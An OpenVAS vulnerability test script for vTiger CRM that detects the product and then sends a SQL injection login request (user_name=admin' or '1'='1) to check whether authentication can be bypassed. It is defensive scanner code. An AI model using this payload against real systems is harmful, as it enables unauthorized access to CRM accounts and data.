# OpenVAS Vulnerability Test
# $Id: vtiger_flaws.nasl 5781 2017-03-30 08:15:57Z cfi $
# Description: vTiger multiple flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Ref: Christopher Kunz from Hardened-PHP Project & SEC-CONSULT

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20317");
  script_version("$Revision: 5781 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-30 10:15:57 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3818", "CVE-2005-3819", "CVE-2005-3820", "CVE-2005-3821", "CVE-2005-3822", "CVE-2005-3823", "CVE-2005-3824");
  script_bugtraq_id(15562, 15569);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("vTiger multiple flaw");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "solution" , value : "Upgrade to vtiger 4.5 alpha 2 or later.");
  script_tag(name : "summary" , value : "The remote web server contains a PHP application that is affected by
  multiple flaws.

  Description:

  The remote version of this software is prone to arbitrary code
  execution, directory traversal, SQL injection (allowing authentication 
  bypass), cross-site scripting attacks.");

  script_xref(name : "URL" , value : "http://www.hardened-php.net/advisory_232005.105.html");
  script_xref(name : "URL" , value : "http://www.sec-consult.com/231.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! can_host_php(port:port) ) exit(0);

foreach dir( make_list_unique( "/tigercrm", "/crm", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) continue;

  # If it looks like vtiger...
  if (
    'HREF="include/images/vtigercrm_icon.ico">' >< res ||
    "vtiger.com is not affiliated with nor endorsed by" >< res
  ) {

    host = http_host_name( port:port );
    filename = string(dir, "/index.php");
    variables = string("module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=admin%27+or+%271%27%3D%271&user_password=test&login_theme=blue&login_language=en_us&Login=++Login++");
    req = string(
      "POST ", filename, " HTTP/1.0\r\n", 
      "Referer: ","http://", host, filename, "\r\n",
      "Host: ", host, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables
    );
    result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if(
      # Link to My Account
      "?module=Users&action=DetailView&record=" >< result ||
      "New Contact" >< result
    ) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);